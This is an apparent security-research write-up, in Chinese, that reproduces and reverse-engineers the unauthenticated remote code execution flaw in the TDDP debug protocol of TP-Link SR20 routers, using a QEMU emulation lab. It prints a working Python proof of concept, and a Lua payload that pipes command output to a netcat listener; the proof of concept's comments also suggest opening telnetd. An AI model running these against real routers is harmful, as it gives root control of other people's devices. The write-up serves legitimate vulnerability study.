# TP-Link SR20本地网络远程代码执行漏洞复现与分析
#### 作者：TTX@木链科技物联网有限公司
#### 2019-04-09

##简述

3月26号 Google 安全开发人员 Matthew Garrett在 Twitter 上公布了 TP-Link Smart Home Router (SR20) 的远程代码执行漏洞，公布的原因是他去年 12 月份将相关漏洞报告提交给 TP-Link后没有收到任何回复，于是就公开了。

4月1号 Tp-Link 官网上发表了 TDDP 协议的 V2 版本并提供下载。尽管漏洞已经被修复，但是仍然有大量的路由器固件运行着老版本的协议，仍然处于危险当中。
因此，这里对这个远程代码执行漏洞进行复现与分析，以供未来参考。

此远程代码执行漏洞允许用户在设备上以 root 权限执行任意命令，该漏洞存在于 TP-Link 设备调试协议(TP-Link Device Debug Protocol 英文简称 TDDP) 中，TDDP 是 TP-Link 申请了专利的调试协议，基于 UDP 运行在 1040 端口

TP-Link SR20 设备运行的 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 0x31 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞

由于目前水平有限，漏洞的复现主要参考了[@xax007](https://paper.seebug.org/879/)的过程，其中自己使用的是 Ubuntu16.04 系统。

##构造QEMU环境
使用QEMU的目的是构造模拟SR20的硬件环境，通常可以通过`apt install qemu`直接安装，或者从[官网](https://www.qemu.org/download/#source)上下载稳定版的源码来编译，过程如下：

	$ wget https://download.qemu.org/qemu-4.0.0-rc1.tar.xz
	$ tar xvJf qemu-4.0.0-rc1.tar.xz
	$ cd qemu-4.0.0-rc1
	$ ./configure --target-list=arm-softmmu
	$ make & make install
TP-Link SR20 的固件是基于ARM架构的，因此 ./configure中指定了`target-list`参数，相当于选择只编译ARM版的QEMU，可以加快编译速度。

安装完后可以看到安装的版本
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/qemu-version.png "pic1")

##安装Binwalk
Binwalk 是一款文件分析工具，旨在协助研究人员对文件进行分析，提取及逆向工程，在这里，Binwalk 可以协助我们从固件提取文件系统。安装方法如下：

	$ git clone https://github.com/ReFirmLabs/binwalk
	$ cd binwalk
	$ python setup.py install
	$ sudo ./deps.sh $ Ubuntu 系统用户可以直接使用 deps.sh 脚本安装所有的依赖

###从固件提取文件系统
从 TP-Link SR20 设备官网下载固件， 下载下来是一个 zip 压缩包，解压以后进入解压后目录，可以看到一个名字很长的叫 `tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin` 的文件，这个就是该 SR20 设备的 firmware (固件)

使用 binwalk 查看该固件
`binwalk tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin`
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/binwalk_refer.png "pic2")

可以看到固件中有一个`Squashfd filesystem`，使用`binwalk -Me tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin`将其提取出来。

binwalk会在当前目录的_+bin文件名目录下生成提取出来的固件里的所有内容，进入到该目录

`squashfs-root`目录就是我们需要的固件文件系统


##模拟SR20硬件
从Debian[官网](https://people.debian.org/~aurel32/qemu/armhf/)上下载QEMU需要的Debian ARM系统的三个文件：

- debian_wheezy_armhf_standard.qcow2 2013-12-17 00:04 229M
- initrd.img-3.2.0-4-vexpress 2013-12-17 01:57 2.2M
- vmlinuz-3.2.0-4-vexpress 2013-09-20 18:33 1.9M

把以上三个文件放在同一个目录执行以下命令

	$ sudo tunctl -t tap0 -u `whoami`  # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡
	$ sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置 IP 地址
	$ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/qemu_arm_start.png "pic3")
虚拟机启动成功后会提示登陆

用户名和密码都为`root`
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/qemu_arm_login.png "pic4")

配置网卡IP
`ifconfig eth0 10.10.10.2/24`
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/ifconfig.png "pic5")

可以尝试使用`ping -c 3 10.10.10.1`检测网络的连通性，如果不通，可以检查前面步骤有没有问题或者使用`ifconfig`调试

现在需要把固件中提取出的文件系统打包后上传到QEMU虚拟机中

压缩固件文件系统目录下的整个文件

	$ tar -cjpf squashfs-root.tar.bz2 squashfs-root/
使用 Python 搭建简易HTTPServer

	$ python -m SimpleHTTPServer
在QEMU虚拟机中下载打包好的文件

	$  wget http://10.10.10.1:8000/squashfs-root.tar.bz2

使用chroot切换根目录固件文件系统

	$ mount -o bind /dev ./squashfs-root/dev/
	$ mount -t proc /proc/ ./squashfs-root/proc/
	$ chroot squashfs-root sh # 切换根目录后执行新目录结构下的 sh shell
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/chroot.png "pic6")
需要注意的是，新目录结构下的shell并不是原本的shell，原本很多强大的功能都被限制，例如`netcat`被限制为只能为`nc IP PORT`的形式,而无法加入其它参数，这为后面写`reverse shell`增加许多不必要的麻烦

根据[@xax007](https://paper.seebug.org/879/)的文章，也可以使用树莓派直接做ARM的测试环境，详细情况可以直接进去参考

##漏洞复现
###搭建TFTP Server
在宿主机安装atftpd搭建TFTP服务

	$ sudo apt install atftpd
编辑`/etc/default/atftpd`文件，`USE_INETD=true`改为`USE_INETD=false`，`/srv/tftp`改为`/tftpboot`

修改完后运行以下指令：

	$ mkdir /tftpboot
	$ chmod 777 /tftpboot
	$ sudo systemctl start atftpd # 启动 atftpd
执行命令`sudo systemctl status atftpd`查看atftpd服务状态，为`running`即成功
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/atftp_status.png "pic7")

如果提示`atftpd:can't bind port :69/udp`无法绑定端口，可以执行`sudo systemctl stop inetutils-inetd.service` 停用`inetutils-inetd`服务后，再执行`sudo systemctl restart atftpd`重新启动atftpd即可正常运行atftpd

在atftp的根目录`/tftpboot`下写入payload文件

payload文件内容为：

	function config_test(config)
		os.execute("ls | nc 10.10.10.1 1337")
	end
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/cat_payload.png "pic8")

从参考链接1中得到poc为：

	#!/usr/bin/python3

	# Copyright 2019 Google LLC.
	# SPDX-License-Identifier: Apache-2.0
	
	# Create a file in your tftp directory with the following contents:
	#
	#function config_test(config)
	#  os.execute("telnetd -l /bin/login.sh")
	#end
	#
	# Execute script as poc.py remoteaddr filename
	
	import sys
	import binascii
	import socket
	
	port_send = 1040
	port_receive = 61000
	
	tddp_ver = "01"
	tddp_command = "31"
	tddp_req = "01"
	tddp_reply = "00"
	tddp_padding = "%0.16X" % 00
	
	tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])
	
	sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock_receive.bind(('', port_receive))
	
	# Send a request
	sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	packet = binascii.unhexlify(tddp_packet)
	argument = "%s;arbitrary" % sys.argv[2]
	packet = packet + argument.encode()
	sock_send.sendto(packet, (sys.argv[1], port_send))
	sock_send.close()
	
	response, addr = sock_receive.recvfrom(1024)
	r = response.encode('hex')
	print(r)

重现步骤为：

- 1.QEMU虚拟机中启动tddp程序
- 2.宿主机使用NC监听端口
- 3.执行POC，获取命令执行结果
最终成功重现此漏洞
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/ls_tddp.png)

##漏洞分析
下面来分析这个远程代码执行漏洞的原因:

从文件系统中定位到出错的文件`/usr/bin/tddp`

使用IDA7.0打开并自动分析 `tddp` 文件，结合参考链接1，定位到漏洞发生的函数，按F5可以查看它的伪代码,如下所示：
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/vuln_function.png)

直接定位到了问题代码段，这个tddp_execCmd()直接执行了指令`cd /tmp; tftp -gr %s %s &`,执行的工作是使用`tftp`协议将从第二个参数所在的地址将第一个参数的文件读过来，意思就是,在宿主机上`/tftpboot`目录下的文件会被SR20根据文件名使用`tftp`协议传输过去，在我们的POC里面，也就是之前写好的payload被传输过去了，那么漏洞是如何触发的，继续往下看

![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/vuln_17a20.png)

后面代码的意思是检查这个payload文件是否存在，不存在即什么都不干。

之后其中进行了一个检查:`lua_getfiled(lua_State,0xFFFFD8EE,0x172A0)`，其中0x172A0在通过搜索字符串可知对应了字符串`config_test`
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/config_test.png)

整个函数的功能即：检查payload中是否有`config_test`函数，然后`lua`以`root`运行这个函数。

而当我们能控制这个payload时，相当于控制了整个SR20路由器

那么漏洞发生的条件是什么呢，我们使用`Jump_to_xref`功能可以找到触发这个函数的位，如下所示
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/test_0x31.png)

我们只需要条件满足`0x31`即可进行跳转，继续查看是什么满足`0x31`
![](https://raw.githubusercontent.com/TTXbai/Security/master/SR20_tddp_bug/pic/msg_condition.png)

经过逆向，`msg`是存储信息的结构体，而我们发送的包`packet`从45082处开始，因此`msg[45083]`即，`pakcet[1]`，即数据包的第二位。

我们只需要控制数据包的第二位为0x31，其它位符合协议的结构，即可成功将自己引导入`CMD_FTEST_CONFIG`选项中，执行设计好的`payload`了

漏洞的过程复现和分析到此就告一段落了，在这次复现漏洞和分析的过程中，我也学习到了很多新知识和方法，对漏洞挖掘有了新的理解，同时也认识到漏洞挖掘是多么不容易的一件事，也希望自己能在这一方向上不断进步。


##参考链接

1.[Remote code execution as root from the local network on TP-Link SR20 routers](https://mjg59.dreamwidth.org/51672.html)

2.[一个针对TP-Link调试协议（TDDP）漏洞挖掘的故事](https://www.anquanke.com/post/id/84991)

3.[重现 TP-Link SR20 本地网络远程代码执行漏洞](https://paper.seebug.org/879/)